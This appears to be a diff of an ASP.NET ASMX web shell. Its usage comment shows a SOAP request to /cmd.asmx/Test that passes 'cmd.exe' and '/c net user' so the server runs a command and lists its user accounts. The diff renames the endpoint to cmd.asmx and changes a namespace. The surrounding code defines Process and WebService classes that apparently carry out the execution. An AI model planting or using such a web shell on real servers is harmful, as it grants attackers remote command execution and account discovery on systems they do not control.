@@ -1,6 +1,6 @@
 <%--
 Usage:
-POST /test.asmx/Test HTTP/1.1
+POST /cmd.asmx/Test HTTP/1.1
 Host: example.com
 Content-Type: text/xml; charset=utf-8
 Content-Length: 363
@@ -8,7 +8,7 @@ SOAPAction: "http://tempuri.org/Test"
 <?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
-    <Test xmlns="http://tempuri.org/">
+    <Test xmlns="http://example.com/">
       <Z1>cmd.exe</Z1>
       <Z2>/c net user</Z2>
     </Test>
@@ -42,7 +42,6 @@ public class New_Process :Process
     }
 
 }
-
 
 public class Service : System.Web.Services.WebService
 {
